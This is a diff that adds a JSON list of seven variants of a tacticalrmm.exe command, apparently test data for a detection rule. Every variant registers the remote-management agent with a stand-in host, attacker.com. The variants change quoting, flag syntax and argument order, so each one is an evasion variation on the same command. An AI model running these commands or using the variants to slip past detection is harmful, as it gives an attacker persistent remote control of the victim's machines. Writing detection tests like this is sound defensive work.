@@ -1,0 +1,30 @@
+[
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token --client-id 1 --site-id 2 --agent-type mesh",
+    "explanation": "This is the original true positive command with no mutation applied, used as a baseline for testing."
+  },
+  {
+    "output": "tacticalrmm.exe --api \"http://attacker.com\" --auth token --client-id 1 --site-id 2 --agent-type mesh",
+    "explanation": "Inserted quotes around the --api URL to test parsing behavior while maintaining the same functionality."
+  },
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token --client-id=1 --site-id=2 --agent-type=mesh",
+    "explanation": "Used equals signs (=) instead of spaces for some arguments to test alternative syntax parsing."
+  },
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token --client-id 1 --site-id 2 --agent-type workstation",
+    "explanation": "Replaced '--agent-type mesh' with '--agent-type workstation' to test substitution of equivalent agent types."
+  },
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token --client-id 1 --site-id 2 mesh --agent-type",
+    "explanation": "Reordered '--agent-type mesh' to test if the program accepts positional arguments in a different order."
+  },
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token --client-id 1 --site-id 2 --agent-type mesh --",
+    "explanation": "Added a trailing '--' to indicate end of options, testing if the program accepts this as valid syntax."
+  },
+  {
+    "output": "tacticalrmm.exe --api http://attacker.com --auth token -c 1 -s 2 --agent-type mesh",
+    "explanation": "Used short flags '-c' and '-s' as substitutes for '--client-id' and '--site-id' if supported by the program."
+  }
+]
